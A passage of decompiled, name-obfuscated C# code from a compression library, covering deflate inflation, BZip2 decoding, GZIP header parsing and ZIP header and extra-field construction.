				int num6 = (class40_0.int_2 = num3 & 0x3FFF);
				if ((num6 & 0x1F) <= 29 && ((num6 >> 5) & 0x1F) <= 29)
				{
					num6 = 258 + (num6 & 0x1F) + ((num6 >> 5) & 0x1F);
					if (class40_0.int_4 != null && class40_0.int_4.Length >= num6)
					{
						Array.Clear(class40_0.int_4, 0, num6);
					}
					else
					{
						class40_0.int_4 = new int[num6];
					}
					num3 >>= 14;
					i -= 14;
					class40_0.int_3 = 0;
					class40_0.enum16_0 = Class40.Enum16.const_4;
					goto case Class40.Enum16.const_4;
				}
				class40_0.enum16_0 = Class40.Enum16.const_9;
				class40_0.gclass2_0.string_0 = "too many length or distance symbols";
				int_0 = -3;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, -3);
			}
			case Class40.Enum16.const_2:
				if (num2 != 0)
				{
					if (num5 == 0)
					{
						if (num4 == class40_0.int_11 && class40_0.int_12 != 0)
						{
							num4 = 0;
							num5 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
						}
						if (num5 == 0)
						{
							class40_0.int_13 = num4;
							int_0 = Class6.smethod_639(class40_0, int_0);
							num4 = class40_0.int_13;
							num5 = ((num4 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
							if (num4 == class40_0.int_11 && class40_0.int_12 != 0)
							{
								num4 = 0;
								num5 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
							}
							if (num5 == 0)
							{
								class40_0.int_9 = num3;
								class40_0.int_8 = i;
								class40_0.gclass2_0.int_1 = num2;
								class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
								class40_0.gclass2_0.int_0 = num;
								class40_0.int_13 = num4;
								return Class6.smethod_639(class40_0, int_0);
							}
						}
					}
					int_0 = 0;
					int num6 = class40_0.int_1;
					if (num6 > num2)
					{
						num6 = num2;
					}
					if (num6 > num5)
					{
						num6 = num5;
					}
					Array.Copy(class40_0.gclass2_0.byte_0, num, class40_0.byte_0, num4, num6);
					num += num6;
					num2 -= num6;
					num4 += num6;
					num5 -= num6;
					if ((class40_0.int_1 -= num6) == 0)
					{
						class40_0.enum16_0 = ((class40_0.int_7 != 0) ? Class40.Enum16.const_7 : Class40.Enum16.const_0);
					}
					break;
				}
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, int_0);
			case Class40.Enum16.const_1:
				for (; i < 32; i += 8)
				{
					if (num2 != 0)
					{
						int_0 = 0;
						num2--;
						num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
						continue;
					}
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, int_0);
				}
				if (((~num3 >> 16) & 0xFFFF) == (num3 & 0xFFFF))
				{
					class40_0.int_1 = num3 & 0xFFFF;
					i = 0;
					num3 = 0;
					class40_0.enum16_0 = ((class40_0.int_1 != 0) ? Class40.Enum16.const_2 : ((class40_0.int_7 != 0) ? Class40.Enum16.const_7 : Class40.Enum16.const_0));
					break;
				}
				class40_0.enum16_0 = Class40.Enum16.const_9;
				class40_0.gclass2_0.string_0 = "invalid stored block lengths";
				int_0 = -3;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, -3);
			case Class40.Enum16.const_0:
			{
				for (; i < 3; i += 8)
				{
					if (num2 != 0)
					{
						int_0 = 0;
						num2--;
						num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
						continue;
					}
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, int_0);
				}
				int num6 = num3 & 7;
				class40_0.int_7 = num6 & 1;
				switch ((uint)num6 >> 1)
				{
				case 0u:
					num3 >>= 3;
					i -= 3;
					num6 = i & 7;
					num3 >>= num6;
					i -= num6;
					class40_0.enum16_0 = Class40.Enum16.const_1;
					break;
				case 1u:
				{
					int[] array = new int[1];
					int[] array2 = new int[1];
					int[][] array3 = new int[1][];
					int[][] array4 = new int[1][];
					Class6.smethod_440(array2, array3, array, array4, class40_0.gclass2_0);
					Class6.smethod_227(class40_0.class42_0, array[0], array2[0], array3[0], 0, array4[0], 0);
					num3 >>= 3;
					i -= 3;
					class40_0.enum16_0 = Class40.Enum16.const_6;
					break;
				}
				case 2u:
					num3 >>= 3;
					i -= 3;
					class40_0.enum16_0 = Class40.Enum16.const_3;
					break;
				case 3u:
					num3 >>= 3;
					i -= 3;
					class40_0.enum16_0 = Class40.Enum16.const_9;
					class40_0.gclass2_0.string_0 = "invalid block type";
					int_0 = -3;
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, -3);
				}
				break;
			}
			default:
				int_0 = -2;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, -2);
			case Class40.Enum16.const_7:
				class40_0.int_13 = num4;
				int_0 = Class6.smethod_639(class40_0, int_0);
				num4 = class40_0.int_13;
				num5 = ((num4 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
				if (class40_0.int_12 != class40_0.int_13)
				{
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, int_0);
				}
				class40_0.enum16_0 = Class40.Enum16.const_8;
				goto case Class40.Enum16.const_8;
			case Class40.Enum16.const_8:
				int_0 = 1;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, 1);
			case Class40.Enum16.const_9:
				int_0 = -3;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, -3);
			}
		}
	}

	static short smethod_309(int int_0)
	{
		return (short)((Class73.Class79.byte_0[int_0 & 0xF] << 12) | (Class73.Class79.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class73.Class79.byte_0[(int_0 >> 8) & 0xF] << 4) | Class73.Class79.byte_0[int_0 >> 12]);
	}

	static EventArgs4 smethod_310(string string_0, GClass0 gclass0_0, string string_1)
	{
		EventArgs4 eventArgs = new EventArgs4();
		eventArgs.string_0 = string_0;
		eventArgs.enum6_0 = Enum6.const_17;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.string_1 = string_1;
		return eventArgs;
	}

	static GClass0 smethod_311(Delegate1 delegate1_0, GClass1 gclass1_0, Delegate2 delegate2_0, string string_0)
	{
		GClass0 gclass0_ = Class6.smethod_562(delegate1_0, string_0, delegate2_0);
		DateTime now = DateTime.Now;
		DateTime now2 = DateTime.Now;
		DateTime now3 = DateTime.Now;
		Class6.smethod_520(now, now3, now2, gclass0_);
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
		}
		return Class6.smethod_108(gclass1_0, gclass0_);
	}

	static GClass0 smethod_312(string string_0, Stream stream_0, GClass1 gclass1_0)
	{
		Class6.smethod_26(string_0, gclass1_0);
		return Class6.smethod_479(stream_0, string_0, gclass1_0);
	}

	static GClass0 smethod_313(GClass1 gclass1_0, string string_0, string string_1, Enum10 enum10_0, bool bool_0, int int_0)
	{
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("{0} {1}...", (enum10_0 == Enum10.const_0) ? "adding" : "Adding or updating", string_0);
		}
		if (int_0 == 0)
		{
			gclass1_0.bool_10 = false;
			Class6.smethod_384(gclass1_0);
		}
		if (gclass1_0.bool_10)
		{
			return null;
		}
		string string_2 = string_1;
		GClass0 gClass = null;
		if (int_0 > 0)
		{
			int num = string_0.Length;
			for (int num2 = int_0; num2 > 0; num2--)
			{
				num = string_0.LastIndexOfAny("/\\".ToCharArray(), num - 1, num - 1);
			}
			string_2 = string_0.Substring(num + 1);
			string_2 = Path.Combine(string_1, string_2);
		}
		if (int_0 > 0 || string_1 != "")
		{
			gClass = Class6.smethod_640(string_0, string_2);
			gClass.class8_0 = new Class8(gclass1_0);
			gClass.AlternateEncoding = gclass1_0.encoding_0;
			gClass.AlternateEncodingUsage = gclass1_0.enum9_0;
			Class6.smethod_498(gClass);
			gClass.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
			gClass.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
			if (!gclass1_0.dictionary_0.ContainsKey(gClass.string_1))
			{
				Class6.smethod_577(gClass.string_1, gclass1_0, gClass);
				Class6.smethod_215(gClass, gclass1_0);
			}
			string_2 = gClass.string_1;
		}
		if (!gclass1_0.bool_10)
		{
			string[] files = Directory.GetFiles(string_0);
			if (bool_0)
			{
				string[] array = files;
				foreach (string string_3 in array)
				{
					if (gclass1_0.bool_10)
					{
						break;
					}
					if (enum10_0 == Enum10.const_0)
					{
						Class6.smethod_407(gclass1_0, string_3, string_2);
					}
					else
					{
						Class6.smethod_129(gclass1_0, string_3, string_2);
					}
				}
				if (!gclass1_0.bool_10)
				{
					string[] directories = Directory.GetDirectories(string_0);
					string[] array2 = directories;
					foreach (string text in array2)
					{
						FileAttributes attributes = File.GetAttributes(text);
						if (gclass1_0.AddDirectoryWillTraverseReparsePoints || (attributes & FileAttributes.ReparsePoint) == 0)
						{
							Class6.smethod_313(gclass1_0, text, string_1, enum10_0, bool_0, int_0 + 1);
						}
					}
				}
			}
		}
		if (int_0 == 0)
		{
			Class6.smethod_211(gclass1_0);
		}
		return gClass;
	}

	static int smethod_314(Enum20 enum20_0, bool bool_0, int int_0, GClass2 gclass2_0)
	{
		gclass2_0.enum20_0 = enum20_0;
		gclass2_0.int_4 = int_0;
		return Class6.smethod_128(gclass2_0, bool_0);
	}

	static byte[] smethod_315(Class54 class54_0)
	{
		return class54_0.byte_0;
	}

	static void smethod_316(Stream6 stream6_0)
	{
		stream6_0.uint_2 = ~stream6_0.gclass3_0.uint_2;
		if (stream6_0.uint_0 != stream6_0.uint_2)
		{
			string message = $"BZip2 CRC error (expected {stream6_0.uint_0:X8}, computed {stream6_0.uint_2:X8})";
			throw new IOException(message);
		}
		stream6_0.uint_3 = (stream6_0.uint_3 << 1) | (stream6_0.uint_3 >> 31);
		stream6_0.uint_3 ^= stream6_0.uint_2;
	}

	static void smethod_317(Class61 class61_0, StringDictionary stringDictionary_0)
	{
		class61_0.stringDictionary_0 = stringDictionary_0;
	}

	static Encoding smethod_318(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return GClass1.encoding_1;
		}
		if (class8_0.stream0_0 != null)
		{
			return Class6.smethod_481();
		}
		return null;
	}

	static GClass0 smethod_319(string string_0, GClass1 gclass1_0, string string_1)
	{
		return Class6.smethod_456(string_0, string_1, gclass1_0, Enum10.const_1);
	}

	static byte[] smethod_320(long long_0, long long_1, Enum8 enum8_0, int int_0, string string_0, Class8 class8_0)
	{
		Encoding encoding = Class6.smethod_235(class8_0, string_0);
		int num = 0;
		int num2 = 22;
		byte[] array = null;
		short num3 = 0;
		if (string_0 != null && string_0.Length != 0)
		{
			array = encoding.GetBytes(string_0);
			num3 = (short)array.Length;
		}
		num2 += num3;
		byte[] array2 = new byte[num2];
		int num4 = 0;
		byte[] bytes = BitConverter.GetBytes(101010256u);
		Array.Copy(bytes, 0, array2, 0, 4);
		num4 = 4;
		num4 = 5;
		array2[4] = 0;
		num4 = 6;
		array2[5] = 0;
		num4 = 7;
		array2[6] = 0;
		num4 = 8;
		array2[7] = 0;
		if (int_0 < 65535 && enum8_0 != Enum8.const_3)
		{
			array2[num4++] = (byte)((uint)int_0 & 0xFFu);
			array2[num4++] = (byte)((int_0 & 0xFF00) >> 8);
			array2[num4++] = (byte)((uint)int_0 & 0xFFu);
			array2[num4++] = (byte)((int_0 & 0xFF00) >> 8);
		}
		else
		{
			for (num = 0; num < 4; num++)
			{
				array2[num4++] = byte.MaxValue;
			}
		}
		long num5 = long_1 - long_0;
		if (num5 < 4294967295L && long_0 < 4294967295L)
		{
			array2[num4++] = (byte)((ulong)num5 & 0xFFuL);
			array2[num4++] = (byte)((num5 & 0xFF00L) >> 8);
			array2[num4++] = (byte)((num5 & 0xFF0000L) >> 16);
			array2[num4++] = (byte)((num5 & 0xFF000000L) >> 24);
			array2[num4++] = (byte)((ulong)long_0 & 0xFFuL);
			array2[num4++] = (byte)((long_0 & 0xFF00L) >> 8);
			array2[num4++] = (byte)((long_0 & 0xFF0000L) >> 16);
			array2[num4++] = (byte)((long_0 & 0xFF000000L) >> 24);
		}
		else
		{
			for (num = 0; num < 8; num++)
			{
				array2[num4++] = byte.MaxValue;
			}
		}
		if (string_0 != null && string_0.Length != 0)
		{
			if (num3 + num4 + 2 > array2.Length)
			{
				num3 = (short)(array2.Length - num4 - 2);
			}
			array2[num4++] = (byte)((uint)num3 & 0xFFu);
			array2[num4++] = (byte)((num3 & 0xFF00) >> 8);
			if (num3 != 0)
			{
				for (num = 0; num < num3 && num4 + num < array2.Length; num++)
				{
					array2[num4 + num] = array[num];
				}
				num4 += num;
			}
		}
		else
		{
			array2[num4++] = 0;
			array2[num4++] = 0;
		}
		return array2;
	}

	static int smethod_321(int int_0, Stream6 stream6_0)
	{
		Stream6.Class34 class34_ = stream6_0.class34_0;
		int num = class34_.byte_1[int_0] & 0xFF;
		int[] array = class34_.int_1[num];
		int num2 = class34_.int_4[num];
		int num3 = Class6.smethod_532(stream6_0, num2);
		int i = stream6_0.int_4;
		int num4 = stream6_0.int_3;
		while (num3 > array[num2])
		{
			num2++;
			for (; i < 1; i += 8)
			{
				int num5 = stream6_0.stream_0.ReadByte();
				if (num5 >= 0)
				{
					num4 = (num4 << 8) | num5;
					continue;
				}
				throw new IOException("unexpected end of stream");
			}
			i--;
			num3 = (num3 << 1) | ((num4 >> i) & 1);
		}
		stream6_0.int_4 = i;
		stream6_0.int_3 = num4;
		return class34_.int_3[num][num3 - class34_.int_2[num][num2]];
	}

	static void smethod_322(Stream8 stream8_0, int int_0)
	{
		if (int_0 < 4)
		{
			throw new ArgumentException("MaxWorkers", "Value must be 4 or greater.");
		}
		stream8_0.int_1 = int_0;
	}

	static void smethod_323(Exception exception_0, GClass0 gclass0_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null)
		{
			gclass0_0.bool_12 = Class6.smethod_53(exception_0, gclass0_0, gclass0_0.class8_0.gclass1_0);
		}
	}

	static EventArgs3 smethod_324(string string_0)
	{
		return new EventArgs3(string_0, Enum6.const_8);
	}

	static byte[] smethod_325(GClass0 gclass0_0)
	{
		string text = Class6.smethod_146(gclass0_0);
		switch (gclass0_0.AlternateEncodingUsage)
		{
		case Enum9.const_0:
			if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
			{
				gclass0_0.byte_0 = GClass0.encoding_0.GetBytes(gclass0_0.string_2);
			}
			gclass0_0.encoding_1 = GClass0.encoding_0;
			return GClass0.encoding_0.GetBytes(text);
		default:
		{
			byte[] bytes = GClass0.encoding_0.GetBytes(text);
			string @string = GClass0.encoding_0.GetString(bytes, 0, bytes.Length);
			gclass0_0.byte_0 = null;
			if (@string != text)
			{
				bytes = gclass0_0.AlternateEncoding.GetBytes(text);
				if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
				{
					gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
				}
				gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
				return bytes;
			}
			gclass0_0.encoding_1 = GClass0.encoding_0;
			if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
			{
				byte[] bytes2 = GClass0.encoding_0.GetBytes(gclass0_0.string_2);
				string string2 = GClass0.encoding_0.GetString(bytes2, 0, bytes2.Length);
				if (string2 != gclass0_0.string_2)
				{
					bytes = gclass0_0.AlternateEncoding.GetBytes(text);
					gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
					gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
					return bytes;
				}
				gclass0_0.byte_0 = bytes2;
				return bytes;
			}
			return bytes;
		}
		case Enum9.const_3:
			if (gclass0_0.string_2 != null && gclass0_0.string_2.Length != 0)
			{
				gclass0_0.byte_0 = gclass0_0.AlternateEncoding.GetBytes(gclass0_0.string_2);
			}
			gclass0_0.encoding_1 = gclass0_0.AlternateEncoding;
			return gclass0_0.AlternateEncoding.GetBytes(text);
		}
	}

	static byte[] smethod_326(string string_0)
	{
		return Class6.smethod_333(string_0, Class20.encoding_0);
	}

	static int smethod_327(Enum21 enum21_0, GClass2 gclass2_0, Enum20 enum20_0)
	{
		if (gclass2_0.class38_0 == null)
		{
			throw new GException0("No Deflate State!");
		}
		return Class6.smethod_351(gclass2_0.class38_0, enum20_0, enum21_0);
	}

	static void smethod_328(byte byte_0, GClass3 gclass3_0)
	{
		if (gclass3_0.bool_0)
		{
			uint num = (gclass3_0.uint_2 >> 24) ^ byte_0;
			gclass3_0.uint_2 = (gclass3_0.uint_2 << 8) ^ gclass3_0.uint_1[num];
		}
		else
		{
			uint num2 = (gclass3_0.uint_2 & 0xFFu) ^ byte_0;
			gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8) ^ gclass3_0.uint_1[num2];
		}
	}

	static void smethod_329(Stream6 stream6_0)
	{
		if (stream6_0.int_11 < stream6_0.char_0)
		{
			stream6_0.int_6 = stream6_0.int_8;
			GClass3 gclass3_ = stream6_0.gclass3_0;
			byte byte_ = (byte)stream6_0.int_8;
			Class6.smethod_328(byte_, gclass3_);
			stream6_0.int_11++;
		}
		else
		{
			stream6_0.enum11_0 = Stream6.Enum11.const_2;
			stream6_0.int_10++;
			stream6_0.int_7 = 0;
			Class6.smethod_512(stream6_0);
		}
	}

	static GClass1 smethod_330(Stream stream_0, Class28 class28_0)
	{
		if (class28_0 == null)
		{
			throw new ArgumentNullException("options");
		}
		return Class6.smethod_665(stream_0, class28_0.method_1(), class28_0.method_2(), class28_0.method_0());
	}

	static bool smethod_331(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.bool_0;
	}

	static GClass0 smethod_332(GClass1 gclass1_0, string string_0)
	{
		return Class6.smethod_276((string)null, string_0, gclass1_0);
	}

	static byte[] smethod_333(string string_0, Encoding encoding_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static bool smethod_334(Class73.Class74 class74_0)
	{
		switch (class74_0.int_4)
		{
		case 2:
		{
			if (class74_0.bool_0)
			{
				class74_0.int_4 = 12;
				return false;
			}
			int num = Class6.smethod_366(class74_0.class75_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class6.smethod_409(class74_0.class75_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class74_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class6.smethod_605(class74_0.class75_0);
				class74_0.int_4 = 3;
				break;
			case 1:
				class74_0.class77_0 = Class73.Class77.class77_0;
				class74_0.class77_1 = Class73.Class77.class77_1;
				class74_0.int_4 = 7;
				break;
			case 2:
				class74_0.class78_0 = new Class73.Class78();
				class74_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class74_0.int_8 = Class6.smethod_366(class74_0.class75_0, 16)) < 0)
			{
				return false;
			}
			Class6.smethod_409(class74_0.class75_0, 16);
			class74_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class6.smethod_366(class74_0.class75_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class6.smethod_409(class74_0.class75_0, 16);
			class74_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class6.smethod_482(class74_0.class76_0, class74_0.class75_0, class74_0.int_8);
			class74_0.int_8 -= num3;
			if (class74_0.int_8 == 0)
			{
				class74_0.int_4 = 2;
				return true;
			}
			return !Class6.smethod_132(class74_0.class75_0);
		}
		case 6:
			if (!Class6.smethod_432(class74_0.class78_0, class74_0.class75_0))
			{
				return false;
			}
			class74_0.class77_0 = Class6.smethod_625(class74_0.class78_0);
			class74_0.class77_1 = Class6.smethod_350(class74_0.class78_0);
			class74_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class6.smethod_628(class74_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_335(Class53 class53_0, Exception exception_0)
	{
		class53_0.exception_0 = exception_0;
	}

	static int smethod_336(Stream13 stream13_0)
	{
		return (int)(~stream13_0.gclass3_0.uint_2);
	}

	static string smethod_337(Stream12 stream12_0)
	{
		List<byte> list = new List<byte>();
		bool flag = false;
		do
		{
			int num = stream12_0.stream_0.Read(stream12_0.byte_1, 0, 1);
			if (num == 1)
			{
				if (stream12_0.byte_1[0] == 0)
				{
					flag = true;
				}
				else
				{
					list.Add(stream12_0.byte_1[0]);
				}
				continue;
			}
			throw new GException0("Unexpected EOF reading GZIP header.");
		}
		while (!flag);
		byte[] array = list.ToArray();
		return Stream10.encoding_0.GetString(array, 0, array.Length);
	}

	static void smethod_338(GClass1 gclass1_0, string string_0)
	{
		try
		{
			Class6.smethod_438(string_0, gclass1_0, (TextWriter)null);
		}
		catch (Exception exception_)
		{
			throw new ZipException($"{string_0} is not a valid zip file", exception_);
		}
	}

	static byte[] smethod_339(GClass0 gclass0_0, bool bool_0)
	{
		List<byte[]> list = new List<byte[]>();
		if (Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3 || (Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_2 && (!bool_0 || gclass0_0.nullable_1.Value)))
		{
			int num = 4 + (bool_0 ? 28 : 16);
			byte[] array = new byte[num];
			int num2 = 0;
			if (!gclass0_0.bool_13 && !bool_0)
			{
				array[num2++] = 153;
				array[num2++] = 153;
			}
			else
			{
				array[num2++] = 1;
				array[num2++] = 0;
			}
			array[num2++] = (byte)(num - 4);
			array[num2++] = 0;
			Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, array, num2, 8);
			num2 += 8;
			Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, array, num2, 8);
			num2 += 8;
			if (bool_0)
			{
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_4), 0, array, num2, 8);
				num2 += 8;
				Array.Copy(BitConverter.GetBytes(0), 0, array, num2, 4);
			}
			list.Add(array);
		}
		if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
		{
			byte[] array = new byte[11];
			int num3 = 0;
			byte[] array2 = array;
			num3 = 1;
			array2[0] = 1;
			byte[] array3 = array;
			num3 = 2;
			array3[1] = 153;
			byte[] array4 = array;
			num3 = 3;
			array4[2] = 7;
			byte[] array5 = array;
			num3 = 4;
			array5[3] = 0;
			byte[] array6 = array;
			num3 = 5;
			array6[4] = 1;
			byte[] array7 = array;
			num3 = 6;
			array7[5] = 0;
			byte[] array8 = array;
			num3 = 7;
			array8[6] = 65;
			byte[] array9 = array;
			num3 = 8;
			array9[7] = 69;
			switch (Class6.smethod_222(gclass0_0.enum2_0))
			{
			case 128:
				array[num3] = 1;
				break;
			case 256:
				array[num3] = 3;
				break;
			default:
				array[num3] = byte.MaxValue;
				break;
			}
			num3++;
			array[num3++] = (byte)((uint)gclass0_0.short_8 & 0xFFu);
			array[num3++] = (byte)((uint)gclass0_0.short_8 & 0xFF00u);
			list.Add(array);
		}
		if (gclass0_0.bool_0 && gclass0_0.bool_1)
		{
			byte[] array = new byte[36]
			{
				10, 0, 32, 0, 0, 0, 0, 0, 1, 0,
				24, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0
			};
			long value = gclass0_0.dateTime_1.ToFileTime();
			Array.Copy(BitConverter.GetBytes(value), 0, array, 12, 8);
			value = gclass0_0.dateTime_2.ToFileTime();
			Array.Copy(BitConverter.GetBytes(value), 0, array, 20, 8);
			value = gclass0_0.dateTime_3.ToFileTime();
			Array.Copy(BitConverter.GetBytes(value), 0, array, 28, 8);
			list.Add(array);
		}
		if (gclass0_0.bool_0 && gclass0_0.bool_2)
		{
			int num4 = 9;
			if (!bool_0)
			{
				num4 += 8;
			}
			byte[] array = new byte[num4];
			int num5 = 0;
			byte[] array10 = array;
			num5 = 1;
			array10[0] = 85;
			byte[] array11 = array;
			num5 = 2;
			array11[1] = 84;
			byte[] array12 = array;
			num5 = 3;
			array12[2] = (byte)(num4 - 4);
			byte[] array13 = array;
			num5 = 4;
			array13[3] = 0;
			byte[] array14 = array;
			num5 = 5;
			array14[4] = 7;
			int value2 = (int)(gclass0_0.dateTime_1 - GClass0.dateTime_4).TotalSeconds;
			Array.Copy(BitConverter.GetBytes(value2), 0, array, 5, 4);
			num5 = 9;
			if (!bool_0)
			{
				value2 = (int)(gclass0_0.dateTime_2 - GClass0.dateTime_4).TotalSeconds;
				Array.Copy(BitConverter.GetBytes(value2), 0, array, num5, 4);
				num5 += 4;
				value2 = (int)(gclass0_0.dateTime_3 - GClass0.dateTime_4).TotalSeconds;
				Array.Copy(BitConverter.GetBytes(value2), 0, array, num5, 4);
				num5 += 4;
			}
			list.Add(array);
		}
		byte[] array15 = null;
		if (list.Count > 0)
		{
			int num6 = 0;
			int num7 = 0;
			for (int i = 0; i < list.Count; i++)
			{
				num6 += list[i].Length;
			}
			array15 = new byte[num6];
			for (int i = 0; i < list.Count; i++)
			{
				Array.Copy(list[i], 0, array15, num7, list[i].Length);
				num7 += list[i].Length;
			}
		}
		return array15;
	}

	static byte[] smethod_340(Stream3 stream3_0)
	{
		if (!stream3_0.bool_0)
		{
			if (stream3_0.long_1 != 0L)
			{
				throw new BadStateException("The final hash has not been computed.");
			}
			byte[] buffer = new byte[0];
			stream3_0.hmacsha1_0.ComputeHash(buffer);
		}
		byte[] array = new byte[10];
		Array.Copy(stream3_0.hmacsha1_0.Hash, 0, array, 0, 10);
		return array;
	}

	static int smethod_341(int[] int_0, Class44 class44_0, int[] int_1, int[] int_2, int[] int_3, GClass2 gclass2_0)
	{
		Class6.smethod_34(class44_0, 19);
		class44_0.int_6[0] = 0;
		int[] int_4 = class44_0.int_6;
		int[] int_5 = class44_0.int_7;
		int num = Class6.smethod_266(int_2, int_1, class44_0, 19, int_3, 19, int_4, (int[])null, (int[])null, int_5, 0, int_0);
		if (num == -3)
		{
			gclass2_0.string_0 = "oversubscribed dynamic bit lengths tree";
		}
		else if (num == -5 || int_2[0] == 0)
		{
			gclass2_0.string_0 = "incomplete dynamic bit lengths tree";
			num = -3;
		}
		return num;
	}

	static void smethod_342(int int_0, GClass0 gclass0_0)
	{
		if (int_0 == 0)
		{
			throw new BadReadException($"bad read of entry {gclass0_0.string_1} from compressed archive.");
		}
	}

	static int smethod_343(Class73.Class75 class75_0)
	{
		return class75_0.int_1 - class75_0.int_0 + (class75_0.int_2 >> 3);
	}

	static void smethod_344(GClass0 gclass0_0, Stream stream_0, [Out] long long_0, out Stream4 stream4_0, out Stream stream_1, out Stream stream_2, ref Stream13 stream13_0)
	{
		stream4_0 = new Stream4(stream_0);
		if (long_0 != 0L)
		{
			stream_1 = Class6.smethod_86((Stream)stream4_0, gclass0_0);
			stream_2 = Class6.smethod_415(long_0, gclass0_0, stream_1);
		}
		else
		{
			stream_1 = (stream_2 = stream4_0);
		}
		stream13_0 = new Stream13(stream_2, bool_1: true);
	}

	static int smethod_345(Class19 class19_0)
	{
		return class19_0.int_0 / 8;
	}

	static void smethod_346(Class9 class9_0, Class15 class15_0)
	{
		class15_0.class9_1 = class9_0;
		if (class9_0 == null)
		{
			class15_0.logicalConjunction_0 = LogicalConjunction.NONE;
		}
		else if (class15_0.logicalConjunction_0 == LogicalConjunction.NONE)
		{
			class15_0.logicalConjunction_0 = LogicalConjunction.AND;
		}
	}

	static int smethod_347(int int_0, int int_1)
	{
		int num = 0;
		do
		{
			num |= int_0 & 1;
			int_0 >>= 1;
			num <<= 1;
		}
		while (--int_1 > 0);
